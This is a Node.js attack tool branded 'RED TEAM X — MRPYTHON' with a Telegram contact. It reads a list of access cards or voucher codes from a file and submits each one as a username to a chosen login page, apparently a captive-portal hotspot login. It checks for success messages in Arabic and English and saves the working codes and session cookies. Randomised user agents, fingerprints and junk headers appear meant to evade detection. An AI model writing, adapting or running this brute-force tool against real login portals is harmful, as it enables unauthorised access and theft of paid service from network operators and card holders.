// =======================
//   RED TEAM X — MRPYTHON 🎩
//   DARK VOID GHOST EDITION v3
//   Interactive Config Mode
// =======================

const fs = require('fs');
const axios = require('axios');
const readline = require('readline');
const { CookieJar } = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');

// =======================
// INTERACTIVE INPUT
// =======================

function ask(question) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    return new Promise(resolve => rl.question(question, ans => {
        rl.close();
        resolve(ans.trim());
    }));
}

async function loadConfig() {
    console.log("\n🔧 Interactive Configuration — Setup Required\n");

    const baseUrl = await ask("🌐 Enter the base domain (example: http://fh.net): ");
    const loginPath = await ask("🔑 Enter the login path (example: /login): ");
    const statusPath = await ask("📡 Enter the status check path (example: /status.html): ");
    const mode = await ask("📨 Enter request method (POST or GET): ");

    const extraFieldsRaw = await ask("⚙️ Enter extra fields (example: domain=512k|var=callBack) or leave empty: ");

    const extraFields = {};
    if (extraFieldsRaw.length > 0) {
        extraFieldsRaw.split("|").forEach(pair => {
            const [key, value] = pair.split("=");
            extraFields[key] = value;
        });
    }

    return {
        mode: mode.toUpperCase(),
        baseUrl,
        loginPath,
        statusPath,
        fields: {
            dst: "",
            popup: "true",
            username: null,
            password: "",
            remember: "ON",
            ...extraFields
        }
    };
}

// =======================
// RED TEAM X BANNER
// =======================

function banner() {
    console.clear();

    console.log("\x1b[33;3m"); // أصفر

    console.log(`
              ⢀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⣴⣴⣾⣾⣾⣿⣿⣾⣿⣾⣿⣷⣷⣷⣷⣦⣦⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⢿⢛⢏⢟⢟⣿⣿⣿⣿⣿⣿⣿⣿⡿⡟⡟⢝⢟⢿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢼⣿⣏⣔⣴⣰⢄⢌⠘⠽⣿⣿⣿⣿⡿⠏⢃⢡⣠⣢⣢⣌⣻⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣮⡢⣮⣿⣿⣿⣮⢪⣾⣾⣿⣿⣿⣿⣿⣿⣯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⢿⣟⠽⠊⠊⠊⠫⢻⣾⣿⣿⣿⣷⠻⠙⠘⠘⠚⢽⢿⣿⣿⣯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣵⣷⣽⣪⣞⣮⣮⣾⣿⣾⣿⣯⣿⣷⣵⣲⣲⣳⣵⣷⣷⣻⣯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢗⣿⣿⣿⣺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣿⣿⣿⣿⣿⣿⢟⣿⣽⣟⣿⣿⣿⢾⣾⢿⡻⣿⣿⣿⣿⣿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⣷⣕⢭⠹⣾⣾⣿⣿⣏⡻⡽⣟⡟⣏⣿⣿⣿⣾⡾⠍⣕⢧⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣷⣝⢦⡈⠟⠟⠟⠏⠁⣠⣦⡀⠈⠛⠟⠟⠟⢀⡾⣣⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣎⢷⣷⣶⣵⣮⣦⣫⣫⣫⣦⣵⣶⣵⣾⢾⣱⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣯⣷⣿⣿⣿⣿⡛⠛⣻⣿⣿⣿⣿⣟⣵⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⢿⣷⣿⣿⣿⣿⡏⠀⢻⣿⣿⣿⣿⣾⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡅⠀⣸⣿⣿⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣧⢀⣾⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

                    ☠  MrPYTHON  ☠

                 RED TEAM X — MRPYTHON
              👁️  GHOST MODE // DARK VOID
              ⚡ CYBER SECURITY RESEARCH ⚡

              Telegram : @mrpythonfpi
`);

    console.log("\x1b[31m");
    console.log("██████╗ ███████╗██████╗     ████████╗███████╗ █████╗ ███╗   ███╗");
    console.log("██╔══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║");
    console.log("██████╔╝█████╗  ██████╔╝       ██║   █████╗  ███████║██╔████╔██║");
    console.log("██╔══██╗██╔══╝  ██╔══██╗       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║");
    console.log("██║  ██║███████╗██║  ██║       ██║   ███████╗██║  ██║██║ ╚═╝ ██║");
    console.log("╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝       ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝");

    console.log("");
    console.log("              👁️  RED TEAM X — MRPYTHON 🎩");
    console.log("              ☣️  DARK VOID // GHOST MODE");
    console.log("              ⚡ Cyber Security Research ⚡");
    console.log("\x1b[0m");
}

banner();


// =======================
// RANDOMIZERS
// =======================

function rand(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomNoise() {
    return Math.random().toString(36).substring(2, 12);
}

function strongNoise() {
    return Math.random().toString(36).substring(2) + Date.now().toString(36);
}

function randomUA() {
    const list = [
        "Mozilla/5.0 (Linux; Android 10; SM-G973F)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (Linux; Android 11; Mi 9T Pro)",
        "Mozilla/5.0 (iPad; CPU OS 13_6 like Mac OS X)"
    ];
    return list[rand(0, list.length - 1)];
}

function randomLang() {
    const langs = [
        "ar-SA,ar;q=0.9,en;q=0.8",
        "en-US,en;q=0.9",
        "fr-FR,fr;q=0.9,en;q=0.8",
        "de-DE,de;q=0.9,en;q=0.8"
    ];
    return langs[rand(0, langs.length - 1)];
}

function randomDevice() {
    const devices = ["Android", "iPhone", "Windows", "Mac", "iPad", "Linux"];
    return devices[rand(0, devices.length - 1)];
}

function generateFingerprint() {
    return [
        Math.random().toString(36).substring(2, 8),
        Date.now().toString(36),
        Math.random().toString(36).substring(2, 8)
    ].join("-");
}

// =======================
// GHOST CLIENT
// =======================

function createGhostClient(jar, config) {
    return wrapper(axios.create({
        jar,
        withCredentials: true,
        timeout: 12000,
        proxy: false,
        validateStatus: () => true,
        headers: {
            "User-Agent": randomUA(),
            "Accept": "*/*",
            "Accept-Language": randomLang(),
            "Origin": config.baseUrl,
            "Referer": config.baseUrl + config.loginPath,
            "X-Noise": strongNoise(),
            "X-Req-ID": strongNoise(),
            "X-Session": strongNoise(),
            "X-Flow": strongNoise(),
            "X-Fingerprint": generateFingerprint(),
            "X-Device": randomDevice(),
            "X-Trace": strongNoise(),
            "X-Ghost": strongNoise()
        }
    }));
}

// =======================
// LOAD CARDS
// =======================

function loadCards(filePath = "cards.txt") {
    const raw = fs.readFileSync(filePath, "utf-8");
    return raw.split("\n").map(s => s.trim()).filter(Boolean);
}

// =======================
// BUILD PAYLOAD
// =======================

function buildPayload(card, config) {
    const fields = { ...config.fields };
    fields.username = card;

    fields.noise = randomNoise();
    fields.token = strongNoise();
    fields.flow = strongNoise();
    fields.junk = Math.random();

    return fields;
}

// =======================
// VERIFY SESSION
// =======================

async function verifySession(client, config) {
    try {
        const res = await client.get(config.baseUrl + config.statusPath);
        const html = res.data.toString();

        return (
            html.includes("تم تسجيل دخولك") ||
            html.includes("تم تسجيل دخولك بنجاح") ||
            html.includes("status") ||
            html.includes("Welcome")
        );
    } catch {
        return false;
    }
}

// =======================
// TEST CARD
// =======================

async function testCard(card, config) {

    const jar = new CookieJar();
    const client = createGhostClient(jar, config);

    const loginUrl = config.baseUrl + config.loginPath;
    const payload = buildPayload(card, config);

    try {
        let res;

        if (config.mode === "GET") {
            const qs = new URLSearchParams(payload).toString();
            res = await client.get(loginUrl + "?" + qs);
        } else {
            const body = new URLSearchParams(payload);
            res = await client.post(loginUrl, body.toString(), {
                headers: { "Content-Type": "application/x-www-form-urlencoded" }
            });
        }

        const html = res.data.toString();

        const basicSuccess =
            html.includes("تم تسجيل دخولك") ||
            html.includes("تم تسجيل دخولك بنجاح") ||
            html.includes("Welcome") ||
            html.includes("login success");

        let sessionValid = false;

        if (basicSuccess) {
            sessionValid = await verifySession(client, config);
        }

        return {
            card,
            success: sessionValid,
            statusCode: res.status,
            cookie: jar.getCookiesSync(loginUrl).map(c => c.key + "=" + c.value),
            time: new Date().toISOString()
        };

    } catch (err) {
        return {
            card,
            success: false,
            error: err.message,
            time: new Date().toISOString()
        };
    }
}

// =======================
// MAIN
// =======================

async function main() {

    banner();

    const config = await loadConfig();
    const cards = loadCards();

    console.log(`🔢 Total cards: ${cards.length}`);

    const results = [];
    const successList = [];

    for (let i = 0; i < cards.length; i++) {

        const card = cards[i];

        console.log("\x1b[35m");
        console.log(`👻 Testing card (${i + 1}/${cards.length}): ${card}`);
        console.log("\x1b[0m");

        const result = await testCard(card, config);
        results.push(result);

        if (result.success) {
            console.log("\x1b[32m✔ REAL LOGIN DETECTED — STOPPING TOOL\x1b[0m");
            console.log("\x1b[32m✔ Successful Card:\x1b[0m " + card);

            successList.push(card);

            fs.writeFileSync("results.json", JSON.stringify(results, null, 2), "utf-8");
            fs.writeFileSync("success.txt", successList.join("\n"), "utf-8");

            console.log("\x1b[32m🎯 Results saved. Tool stopped.\x1b[0m");
            return;
        } else {
            console.log("\x1b[31m✖ Failed:\x1b[0m " + card);
        }

        console.log(`⏱ Waiting 5 seconds...\n`);
        await new Promise(r => setTimeout(r, 5000));
    }

    fs.writeFileSync("results.json", JSON.stringify(results, null, 2), "utf-8");
    fs.writeFileSync("success.txt", successList.join("\n"), "utf-8");

    console.log("\x1b[32m");
    console.log("🎯 Results saved to results.json");
    console.log("🎯 Successful cards saved to success.txt");
    console.log("\x1b[0m");

    console.log("\x1b[31m👾 Script developed by: MRPYTHON — Red Team X 👾\x1b[0m");
}

main().catch(console.error);
